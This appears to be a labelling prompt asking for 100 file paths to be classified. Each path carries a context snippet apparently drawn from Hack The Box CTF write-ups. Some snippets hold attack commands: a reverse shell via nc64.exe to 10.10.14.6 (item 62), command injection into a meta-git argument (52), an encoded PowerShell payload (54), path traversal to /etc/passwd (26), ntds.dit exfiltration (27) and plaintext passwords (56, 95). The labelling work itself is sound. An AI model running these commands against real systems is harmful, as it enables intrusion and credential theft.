@@ -1,0 +1,203 @@
+Label these 100 paths (chunk 13/15).
+Reply with one jsonl code block, one record per path, in input order.
+
+1. /all-in-one/jupyter_configure.sh
+   context: ip.py:        "--public-ip-per-vm --admin-username {admin_id} --admin-password {admin_pw}".format( ./all-in-one/jupyter_configure.sh:    echo "Enter password for Jupyter notebook" ./all-in-one/jupyter
+2. /home/oxdf/.nxc/logs/BLN01_10.129.234.168_2025-07-19_191250_bloodhound.zip
+   context: Done in 0M 18S LDAP        10.129.234.168  389    BLN01            Compressing output into /home/oxdf/.nxc/logs/BLN01_10.129.234.168_2025-07-19_191250_bloodhound.zip
+3. /var/log/installer/subiquity-client-info.log.2048
+   context: .log.2098 /var/log/installer/installer-journal.txt /var/log/installer/subiquity-curtin-install.conf /var/log/installer/subiquity-client-info.log.2048 /var/log/installer/autoinstall-user-data /var/log/
+4. /dev/shm/0xdf.deb
+   context: openmediavault-webgui@derailed:/dev/shm$ /usr/sbin/omv-rpc -u admin apt install '{ "packages": ["/dev/shm/0xdf.deb"] }' "\/tmp\/bgstatusWWgLhR"
+5. /etc/nginx/conf.d/havoc.conf
+   context: /etc/nginx/conf.d/havoc.conf
+6. /portal.guardian.htb/index.php
+   context: n.htb/static => http://portal.guardian.htb/static/ 302      GET        0l        0w        0c http://portal.guardian.htb/index.php => http://portal.guardian.htb/login.php 302      GET        0l       
+7. /hMailServer/bin/hMailServer.ini
+   context: oxdf@hacky$ curl 'http://mailing.htb/download.php?file=../../Program+Files+(x86)/hMailServer/bin/hMailServer.ini' [Directories] ProgramFolder=C:\Program Files (x86)\hMailServer DatabaseFolder=C:\Progr
+8. /var/lib/snapd/snap/bin
+   context: CHARSET XAUTHORITY", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/var/lib/snapd/snap/bin  User developer may run the following commands on bagel:     (root) NOPASSWD
+9. /usr/local/lib/python3.11/dist-packages/itsdangerous/serializer.py
+   context: vyihjNaPDWnvB_Zf') Traceback (most recent call last):   File "<stdin>", line 1, in <module>   File "/usr/local/lib/python3.11/dist-packages/itsdangerous/serializer.py", line 236, in loads     raise _t
+10. c:\Users\Public\Desktop
+   context: c:\Users\Public\Desktop>dir  Volume in drive C has no label.  Volume Serial Number is BE61-D5E0   Directory of c:\Users\Pub
+11. /clicker.htb/info.php
+   context: //clicker.htb/assets => http://clicker.htb/assets/ 200      GET      127l      319w     3343c http://clicker.htb/info.php 302      GET        0l        0w        0c http://clicker.htb/export.php => ht
+12. /clicker.htb/register.php
+   context: cker.htb/admin.php => http://clicker.htb/index.php 200      GET      114l      266w     3253c http://clicker.htb/register.php 302      GET        0l        0w        0c http://clicker.htb/logout.php =
+13. /static../flag.txt
+   context: /static../flag.txt
+14. /home/martin/backups/task.json
+   context: ome/martin/.sqlite_history /home/martin/.profile /home/martin/.python_history /home/martin/backups/ /home/martin/backups/task.json /home/martin/backups/code_home_app-production_app_2024_August.tar.bz2
+15. /usr/local/bin/gpg-agent
+   context: bin/filename,/usr/bin/bash,/bin/sh,/usr/bin/ls,/usr/bin/cat,/usr/bin/id,/usr/local/libexec/scdaemon,/usr/local/bin/gpg-agent  #blacklist ${HOME}/.ssh #blacklist /opt  blacklist /home/silentobserver wh
+16. /var/lib/bind/db.snoopy.htb
+   context: rganization //include "/etc/bind/zones.rfc1918";  zone "snoopy.htb" IN {     type master;     file "/var/lib/bind/db.snoopy.htb";     allow-update { key "rndc-key"; };     allow-transfer { 10.0.0.0/8;
+17. C:\Users\matthew\desktop
+   context: *Evil-WinRM* PS C:\Users\matthew\desktop> cat user.txt a8516fa0************************
+18. /2million.htb/js/htb-frontend.min.js
+   context: 46l      152w     1674c http://2million.htb/404 200      GET        5l     1881w   145660c http://2million.htb/js/htb-frontend.min.js 200      GET      260l      328w    29158c http://2million.htb/ima
+19. C:\Windows\System32\spool\PRINTERS
+   context: *" /><FilePathCondition Path="C:\Windows\System32\spool\drivers\color\*" /><FilePathCondition Path="C:\Windows\System32\spool\PRINTERS:*" /><FilePathCondition Path="C:\Windows\System32\spool\PRINTERS\
+20. /var/backups/
+   context: -     --------- NFS         10.129.234.160  48491  10.129.234.160   0          dr--   4.0KB         /var/backups/. NFS         10.129.234.160  48491  10.129.234.160   0          dr--   4.0KB         /
+21. /home/oxdf/hackthebox/code-10.10.11.62/python_keywords
+   context: : POST  :: URL              : http://10.10.11.62:5000/run_code  :: Wordlist         : FUZZ: /home/oxdf/hackthebox/code-10.10.11.62/python_keywords  :: Header           : Content-Type: application/x-ww
+22. C:\inetpub\bin\Production\PasswordReset.exe
+   context: ---- SHA256          77532B3AA86623E0A9216E8E997BA0BFCC285FFC28AF5CFAFD27EB3276E64860       C:\inetpub\bin\Production\PasswordReset.exe SHA256          77532B3AA86623E0A9216E8E997BA0BFCC285FFC28AF5CFA
+23. /src/content.ts
+   context: map",   entry: {     argon: "./src/argon.ts",     background: "./src/background.ts",     content: "./src/content.ts",     popup: "./src/popup.ts",     import: "./src/import.ts",     options: "./src/op
+24. C:\users\Administrator\Desktop
+   context: PS C:\users\Administrator\Desktop> cat root.txt 1bc134a7************************
+25. C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\BA30A33F3FC2
+   context: B3B0B2D3\313B3BF1ABEA RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\33EFC003BFDB RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\BA30A33F3FC2 RW C:\Windows\SYSVOL\domain\
+26. /....//....//....//....//etc/passwd
+   context: ..//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 104ms] ....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 104ms] ::
+27. C:\programdata\ntds.dit
+   context: M       16777216 ntds.dit   evil-winrm-py PS C:\programdata> download ntds.dit ntds.dit Downloading C:\programdata\ntds.dit: 100%|████████████████████████████████████████████████████████| 16.0M/16.0M 
+28. /tmp/0xdf.spec
+   context: tkeller@socket:~$ sudo build-installer.sh build /tmp/0xdf.spec  267 INFO: PyInstaller: 5.6.2 ...[snip]...
+29. /home/bean/Documents/backup/bean_backup_final.tar.gz
+   context: r.gz . date > /home/bean/Documents/backup_tmp/time.txt cd /home/bean/Documents/backup_tmp tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz . rm -r /home/bean/Documents/backup_tmp
+30. /var/lib/ghost/extra
+   context: ne  RUN ln -s /dev/null /root/.bash_history RUN ln -s /dev/null /home/node/.bash_history  RUN mkdir /var/lib/ghost/extra RUN echo 659cdeec9cd6330001baefbf > /var/lib/ghost/extra/important  COPY posts-
+31. /var/lib/dhcp/dhclient6.eth0.leases
+   context: /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0 message+     838  0.0  0.1   8748  5052 ?        Ss   12:20
+32. C:/Users/Richard/source/repos/repos.txt
+   context: #!/bin/bash  # Define the file containing repository URLs repos_file="C:/Users/Richard/source/repos/repos.txt"  # Specify the path where you want to clone the repositories clone_path="C:/Users/Richard
+33. \\updates.exe\r\nmove
+   context: kb5058392-x64_2881b28817b6e714e61b61a50de9f68605f02bd2.msu -O updates.exe\r\n.\\updates.exe.exe\r\n.\\updates.exe\r\nmove .\\updates.exe .\\updates.msu\r\n.\\updates.msu\r\ndel .\\updates.msu\r\n'
+34. /opt/mitm6/mitm6/mitm6.py
+   context: oxdf@hacky$ proxychains sshpass -p WebAO1337 scp /opt/mitm6/mitm6/mitm6.py wao@192.168.99.12:/tmp/
+35. /tmp/venv/lib/python3.11/site-packages/searchor/main.py
+   context: venv/bin/searchor", line 8, in <module>     sys.exit(cli())              ^^^^^ ...[snip]...   File "/tmp/venv/lib/python3.11/site-packages/searchor/main.py", line 32, in search     url = eval(        
+36. C:\Users\adam.silver\Documents
+   context: Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\adam.silver\Documents>
+37. /opt/security/ml_security.py
+   context: n\:/sbin\:/bin\:/snap/bin  User diego may run the following commands on forgot:     (ALL) NOPASSWD: /opt/security/ml_security.py
+38. /.local/share/composer/.htaccess
+   context: /share/nano/search_history    136673      4 -rw-r--r--   1 hish     hish           13 Jan  6 21:43 ./.local/share/composer/.htaccess    130563      4 -rwxr-xr-x   1 hish     hish         1945 Jan 12 0
+39. /keys/ed25519_gen.pub
+   context: ftp> put ~/keys/ed25519_gen.pub authorized_keys local: /home/oxdf/keys/ed25519_gen.pub remote: authorized_keys 229 Extended Passive
+40. C:/Programdata/rev.exe
+   context: oxdf@hacky$ cat click_me.url [InternetShortcut] URL=file://C:/Programdata/rev.exe IDList=
+41. /content/0xdf.txt
+   context: /content/0xdf.txt
+42. /root/TeamCity/buildAgent/lib/spring-expression.jar
+   context: s-impl.jar:/root/TeamCity/buildAgent/lib/freemarker.jar:/root/TeamCity/buildAgent/lib/snakeyaml.jar:/root/TeamCity/buildAgent/lib/spring-expression.jar:/root/TeamCity/buildAgent/lib/spring-core.jar:/r
+43. C:\Users\Emily\desktop
+   context: *Evil-WinRM* PS C:\Users\Emily\desktop> type user.txt c2aaa812************************
+44. C:\Users\maya\documents
+   context: *Evil-WinRM* PS C:\Users\maya> ls documents      Directory: C:\Users\maya\documents                                                      Mode                 LastWriteTime         Len
+45. /proc/12552/root
+   context: www-data@icinga:/$ firejail --join=12552 changing root to /proc/12552/root Warning: cleaning all supplementary groups Child process initialized in 15.15 ms www-data@icinga:/$
+46. /tmp/tmppwsimkz4
+   context: 2018712582963853053617352388109597008521644753377968319910970205267121939376882831825649228669491 ['/tmp/tmppwsimkz4']  [*] Testing key /tmp/tmppwsimkz4. attack initialized... attack initialized... [*
+47. /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
+   context: oxdf@hacky$ ffuf -u http://10.10.11.205:8080 -H "Host: FUZZ.cerberus.local" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fr icinga          /'___\  /'___\           /'___\        
+48. /var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_014
+   context: file or directory (2) [2415:2418:0309/174909.482917:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_014": No such file or director
+49. /etc/openmediavault/config.xml
+   context: $ nano /etc/openmediavault/config.xml
+50. C:\Users\jdoe\desktop
+   context: *Evil-WinRM* PS C:\Users\jdoe\desktop> type user.txt 7cf4719b************************
+51. /root/TeamCity/buildAgent/lib/agent-launcher.jar
+   context: /root/TeamCity/buildAgent/lib/agentInstaller-UI.jar:/root/TeamCity/buildAgent/lib/agent-openapi.jar:/root/TeamCity/buildAgent/lib/agent-launcher.jar:/root/TeamCity/buildAgent/lib/spring-aspects.jar:/r
+52. /home/developer/user.txt
+   context: gbyolo@faculty:/dev/shm$ sudo -u developer meta-git clone '0xdf||cat /home/developer/user.txt > /dev/shm/.x' meta git cloning into '0xdf||cat /home/developer/user.txt > /dev/shm/.x' at .x  .x:
+53. C:\Windows\NTDS
+   context: C:\Windows\NTDS
+54. C:\windows\SYSVOL\sysvol\blazorized.htb\scripts\A32FF3AEAA23
+   context: *Evil-WinRM* PS C:\windows\SYSVOL\sysvol\blazorized.htb\scripts\A32FF3AEAA23> echo "powershell -e JABj...[snip]...CkA" | Out-File -FilePath 0xdf.bat -Encoding ASCII *Evil-WinRM
+55. /jacob/user.txt
+   context: tyler jacob@outbound:/home$ find . -type f ./jacob/.profile ./jacob/.bash_logout ./jacob/.bashrc ./jacob/user.txt ./jacob/.cache/motd.legal-displayed find: ‘./mel’: Permission denied find: ‘./tyler’: 
+56. /var/backups/grafana.tar.gz
+   context: /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz",   "schedule": "@daily",   "stopped": 
+57. /usr/local/nagiosxi/var/components
+   context: /usr/local/nagiosxi/var/components
+58. /opt/gavel
+   context: /opt/gavel/
+59. /home/oxdf/.nxc/modules/nxc_spider_plus
+   context: [*]  MAX_FILE_SIZE: 50 KB SPIDER_PLUS 10.129.244.81   445    S200401          [*]  OUTPUT_FOLDER: /home/oxdf/.nxc/modules/nxc_spider_plus SMB         10.129.244.81   445    S200401          [*] Enumer
+60. /var/backups/fileusages.csv
+   context: ize) FROM "User" INNER JOIN "File" ON "File"."authorId" = "User"."id" GROUP BY "User".username) TO '/var/backups/fileusages.csv' WITH (FORMAT csv);`);         }, 300000);     } });
+61. /root/psk/hostapd_wpa.conf
+   context: ay, 6 MGT TLS, 7 8 , 9,10,11,12,13 others  # PSK ip addr add $IP_PSK.1/24 dev $WLAN_PSK hostapd_aps /root/psk/hostapd_wpa.conf > /var/log/hostapd_wpa.log &  #TODO #ip addr add $IP_8.1/24 dev $WLAN_MGT
+62. C:\programdata\nc64.exe
+   context: ata> iwr http://10.10.14.6/nc64.exe -outfile nc64.exe PS C:\programdata> .\GodPotato-NET4.exe -cmd "C:\programdata\nc64.exe 10.10.14.6 444 -e cmd.exe"
+63. c:\$Recycle.Bin
+   context: c:\$Recycle.Bin>dir /a  Volume in drive C has no label.  Volume Serial Number is BE61-D5E0   Directory of c:\$Recyc
+64. C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\BEC23D3B2F2A
+   context: 12ADA1BB RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\BBD0B0FAFDAF RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\BEC23D3B2F2A RW C:\Windows\S
+65. C:\inetpub\bin\Staging\PasswordReset.exe
+   context: ordReset.exe SHA256          77532B3AA86623E0A9216E8E997BA0BFCC285FFC28AF5CFAFD27EB3276E64860       C:\inetpub\bin\Staging\PasswordReset.exe
+66. /home/oxdf/hackthebox/registrytwo-10.10.11.223/
+   context: ky$ docker cp unruffled_kilby:/usr/local/tomcat/webapps/hosting.war . Successfully copied 23.5MB to /home/oxdf/hackthebox/registrytwo-10.10.11.223/.
+67. C:\Windows\SYSVOL\sysvol\baby2.vl\scripts\login.vbs
+   context: ialized property values:             -  Value size: 121                Id: 30                Value: C:\Windows\SYSVOL\sysvol\baby2.vl\scripts\login.vbs                Value type: VT_LPWSTR          - 
+68. /opt/PowerSploit/Recon/PowerView.ps1
+   context: evil-winrm-py PS C:\programdata> upload /opt/PowerSploit/Recon/PowerView.ps1 PowerView.ps1 Uploading /opt/PowerSploit/Recon/PowerView.ps1: 768kB [00:03, 262kB/s] [+] File uploa
+69. /usr/games
+   context: /nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/
+70. /var/www/chamilo/main/inc/lib/javascript/bigupload/files
+   context: cess group (1168): Inappropriate ioctl for device bash: no job control in this shell www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$
+71. /var/run/dnsmasq
+   context: 34:65534:nobody:/var:/bin/false ntp:x:123:123:ntp:/var/run/ntp:/bin/false dnsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/false logd:x:514:514:logd:/var/run/logd:/bin/false ubus:x:81:81:ubus:/var/run/
+72. C:\Users\wao\Documents
+   context: K [proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.99.2:5985  ...  OK evil-winrm-py PS C:\Users\wao\Documents>
+73. C:\Windows\System32\Tasks\
+   context: spool\SERVERS\*" /><FilePathCondition Path="C:\Windows\System32\Tasks:*" /><FilePathCondition Path="C:\Windows\System32\Tasks\*" /><FilePathCondition Path="C:\Windows\System32\Tasks\Microsoft\Windows\
+74. /siteisup.htb/dev/.git/objects/pack/pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.pack
+   context: t recursively [-] Fetching http://siteisup.htb/dev/.gitignore [404] ...[snip]... [-] Fetching http://siteisup.htb/dev/.git/objects/pack/pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.pack [200] [-] Run
+75. /root/docs_backup.zip
+   context: /root/docs_backup.zip
+76. /public_html/test.php5
+   context: hp4 Uploading test.php to /public_html/test.php4 sftp> put test.php test.php5 Uploading test.php to /public_html/test.php5 sftp> put test.php test.php6 Uploading test.php to /public_html/test.php6 sft
+77. C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\2BECF3DC0B3D
+   context: \scripts\A32FF3AEAA23\21FDFAAFC1D0 RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\23010E0A1A33 RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\2BECF3DC0B3D RW C:\Windows\SYSVOL\domain\scripts\A32FF
+78. /root/.vim
+   context: /root/.python_history /root/.sqlite_history /root/.ssh /root/.ssh/authorized_keys /root/.ssh/id_rsa /root/.vim /root/.vim/.netrwhist /root/root.txt /root/scripts /root/scripts/backup.tar.gz /root/scri
+79. C:\Users\e.black\Desktop
+   context: *Evil-WinRM* PS C:\Users\e.black\Desktop> type user.txt 6214c8ed************************
+80. C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10
+   context: \scripts\A32FF3AEAA23\F1D30FCB0100 RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\FD33C0CE11AC RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10 RW C:\Windows\SYSVOL\domain\
+81. C:\programdata\gp.exe
+   context: PS C:\> New-Win32Process -Commandline 'C:\programdata\gp.exe -cmd "powershell C:\programdata\shell.ps1 2>&1"' -token $token  Process            : gp.exe Thread
+82. /home/oxdf/repo/.git
+   context: o_world.ps1 ~/repo/ oxdf@hacky$ cd ~/repo/ oxdf@hacky$ git init Initialized empty Git repository in /home/oxdf/repo/.git/ oxdf@hacky$ git add hello_world.ps1  oxdf@hacky$ git commit -m "as on coder" [
+83. /usr/local/bin/excludes/generic_excludes
+   context: d_extensions' not found 2025-08-20 11:49:32,103 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excludes 2025-08-20 11:49:32,103 :: ERROR :: Exclude file 'excludes/
+84. c:\Users\Public
+   context: c:\Users\Public>dir  Volume in drive C has no label.  Volume Serial Number is BE61-D5E0   Directory of c:\Users\Pub
+85. Z:\hackthebox\visual-10.10.11.234\projects\Hello0xdf\Hello0xdf\bin\Debug\net6.0\Hello0xdf.dll
+   context: M... 1>------ Build started: Project: Hello0xdf, Configuration: Debug Any CPU ------ 1>Hello0xdf -> Z:\hackthebox\visual-10.10.11.234\projects\Hello0xdf\Hello0xdf\bin\Debug\net6.0\Hello0xdf.dll ======
+86. C:\Users\mssqlsvc\Desktop
+   context: SQL (SIGNED\Administrator  dbo@master)> xp_cmdshell "dir C:\Users\mssqlsvc\Desktop" output                                                --------------------------------------------
+87. /root/TeamCity/buildAgent/lib/httpmime.jar
+   context: jar:/root/TeamCity/buildAgent/lib/spring-aop.jar:/root/TeamCity/buildAgent/lib/agent-deployment.jar:/root/TeamCity/buildAgent/lib/httpmime.jar:/root/TeamCity/buildAgent/lib/common-runtime.jar:/root/Te
+88. /home/neil/.ssh/authorized_keys
+   context: frank@bookworm:~$ ln -s /home/neil/.ssh/authorized_keys pwn.txt
+89. /certificate.htb/blog.php
+   context: 0c http://certificate.htb/upload.php => login.php 200      GET      565l     1566w    21940c http://certificate.htb/blog.php 200      GET        0l        0w        0c http://certificate.htb/db.php 30
+90. /hackthebox/interpreter-10.129.244.184
+   context: oxdf@mullings:~/hackthebox/interpreter-10.129.244.184$ hashcat sedric.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt hashcat (v7.1.2) starting
+91. /var/run/gaveld.sock
+   context: k();       if (sock_fd < 0) { LAB_00101915:         do {           die("failed to connect to %s\n","/var/run/gaveld.sock"); LAB_0010192a:           perror("fopen"); LAB_00101771:           die("failed
+92. /config/db.js
+   context: ql'); /* Upgraded deprecated mysqljs */  var flash = require('connect-flash');  var db = require('../config/db.js');  var connection = mysql.createConnection(db.db)
+93. /usr/bin/nmap
+   context: bin,     use_pty  User zabbix may run the following commands on unrested:     (ALL : ALL) NOPASSWD: /usr/bin/nmap *
+94. /var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_030
+   context: file or directory (2) [2415:2418:0309/174909.483336:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_030": No such file or director
+95. /opt/pywhisker/pywhisker.py
+   context: oxdf@hacky$ python /opt/pywhisker/pywhisker.py --action list -d outdated.htb -u btables -p 5myBPLPDKT3Bfq --dc-ip 10.10.11.175 -t 10.10.11.175 [!]
+96. /etc/haproxy/haproxy.cfg
+   context: nmentFile=-/etc/default/haproxy     EnvironmentFile=-/etc/sysconfig/haproxy     Environment="CONFIG=/etc/haproxy/haproxy.cfg" "PIDFILE=/run/haproxy.pid" "EXTRAOPTS=-S /run/haproxy-master.sock"     Exe
+97. /dev/shm/backup01.sql
+   context: sandy@hacknet:/var/www/HackNet/backups$ gpg --decrypt backup01.sql.gpg > /dev/shm/backup01.sql gpg: encrypted with 1024-bit RSA key, ID FC53AFB0D6355F16, created 2024-12-29       "Sandy (My key
+98. /openwebanalytics.vessel.htb/index.php
+   context: http://openwebanalytics.vessel.htb/index.php?owa_do=base.loginForm&owa_go=http%3A%2F%2Fopenwebanalytics.vessel.htb%2F&
+99. C:\Users\Administrator\AppData\Roaming\System32\napper.exe
+   context: C:\Users\Administrator\AppData\Roaming\System32\napper.exe
+100. C:\Users\emily.oscars.CICADA\desktop
+   context: *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\desktop> type user.txt ea4481e2************************
